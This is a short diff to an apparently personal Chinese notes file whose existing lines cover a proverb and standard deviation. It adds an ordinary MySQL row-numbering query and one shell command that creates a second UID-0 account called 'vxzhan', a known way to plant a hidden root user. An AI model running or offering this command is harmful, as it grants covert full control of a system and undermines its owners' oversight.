@@ -118,6 +118,9 @@ Love makes all hard hearts gentle.  爱情把一切冷酷的心变得温柔。
 σ标准方差    Xi样本数据，i取1到n    X样本的平均数     n样本个数
 标准方差能反映一个数据集的离散程度，数据整体分布离平均值越近，标准方差就越小。
 
+useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
+select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 
+
 
 
 
